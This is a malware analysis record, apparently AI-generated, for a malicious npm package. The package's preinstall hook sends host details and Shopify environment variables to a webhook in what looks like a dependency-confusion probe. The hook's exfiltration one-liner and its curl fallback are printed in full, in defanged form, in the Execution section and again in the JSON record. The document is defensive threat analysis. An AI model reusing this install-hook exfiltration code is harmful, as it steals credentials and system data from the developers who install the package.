# npm post-purchase-bundler@101.0.3

**Source:** datadog · **Source label:** malicious · **Released:** 2026-05-10 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package runs a `node -e` one-liner from its `preinstall` hook on every registry install. It sends the hostname, username and the names of env vars containing `SHOPIFY` as JSON to a webhook[.]site URL, exiting 0 on response or error. If node fails, a `|| curl` fallback posts the base64-encoded `SHOPIFY` env values to the same URL. There are no gates: nothing in the install path checks the environment before sending.

## Execution

- **preinstall** `node -e "const h=require('https'),os=require('os'); const data=JSON.stringify({event:'RCE_CONFIRMED',host:os.hostname(),user:os.userInfo().username,env:Object.keys(process.env).filter(k=>k.includes('SHOPIFY'))}); const req=h.request({hostname:'webhook[.]site',path:'/4d0c…',method:'POST',headers:{'Content-Type':'application/json','Content-Length':data.length}},(res)=>process.exit(0)); req.on('error',()=>process.exit(0)); req.write(data); req.end();" || curl -X POST -d "$(env | grep SHOPIFY | base64)" hxxps://webhook[.]site/4d0c…`: no package files; inline_eval, inline_shell; errors hidden.

## Gates

None.

## Requirements

- network: webhook[.]site:443 (exfil POST target of the node request and the curl fallback)
- installed_tool: node (the hook runs node -e; curl is only a fallback if node fails)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- The `||` curl step is a fallback chain (runs only when node exits non-zero), recorded as plumbing, not a gate.
- `notify.js` collects git identity, npm registry and `uname -a` for the same webhook but nothing runs it at install (`main` points to a missing `index.js`).
- Version 101.0.3 plus a Shopify-internal style name and Shopify dependencies point to dependency confusion.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "post-purchase-bundler",
    "version": "101.0.3",
    "archive_sha256": "526fd61805bd9c8d10f24484d575027a07284df0ab56ea99c796ae66102d736c",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2026-05-10",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2026-05-10-post-purchase-bundler-v101.0.3.zip",
    "package_root": "layer0/tmp/tmp7vqspdan/post-purchase-bundler/package",
    "cluster_key": "bbbb37bb281c194c2573d3d1975d02cbeec7e4be975551cec305c3aa46e97050",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "node -e \"const h=require('https'),os=require('os'); const data=JSON.stringify({event:'RCE_CONFIRMED',host:os.hostname(),user:os.userInfo().username,env:Object.keys(process.env).filter(k=>k.includes('SHOPIFY'))}); const req=h.request({hostname:'webhook[.]site',path:'/4d0c…',method:'POST',headers:{'Content-Type':'application/json','Content-Length':data.length}},(res)=>process.exit(0)); req.on('error',()=>process.exit(0)); req.write(data); req.end();\" || curl -X POST -d \"$(env | grep SHOPIFY | base64)\" hxxps://webhook[.]site/4d0c…",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "node",
        "launch_style": [
          "inline_eval",
          "inline_shell"
        ],
        "silent_failure": true
      }
    ],
    "delays": [],
    "notes": [
      "Hook: node -e posts hostname, username and the names (not values) of env vars containing SHOPIFY to a webhook[.]site URL; both the response and error handlers call process.exit(0), so request failures are hidden.",
      "The `|| curl -X POST -d \"$(env | grep SHOPIFY | base64)\"` part only runs if the node step exits non-zero (node missing or a crash). It is a fallback chain, not a gate; it sends the SHOPIFY env values base64-encoded to the same webhook.",
      "Tool prefilled download_then_exec, but curl only POSTs data and nothing fetched is run; replaced with inline_shell for the fallback.",
      "The env filter on names containing SHOPIFY selects which data is sent; it is data collection, not a gate.",
      "notify.js (git config user, npm registry, uname -a sent to the same webhook) is not referenced by any hook or by main (index.js, absent), so it does not run at install. Read in full; not recorded."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "webhook[.]site:443",
      "reason": "exfil POST target of the node request and the curl fallback"
    },
    {
      "axis": "installed_tool",
      "value": "node",
      "reason": "the hook runs node -e; curl is only a fallback if node fails"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://webhook[.]site/4d0c…",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": null,
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook unconditionally sends the hostname, username and the names of SHOPIFY-related env vars to a webhook[.]site endpoint, with a curl fallback that sends those env values base64-encoded. It looks like a dependency-confusion probe (high version 101.0.3, Shopify-flavoured name and dependencies) that exfiltrates host data without consent.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [
      {
        "id": "d1",
        "recipe": "inline_script",
        "recipe_version": 1,
        "input": {
          "file": "package.json",
          "derived_from": null
        },
        "params": {
          "hook": "preinstall",
          "flag": "-e"
        },
        "output_sha256": "b9145c9fb22a0512"
      }
    ],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
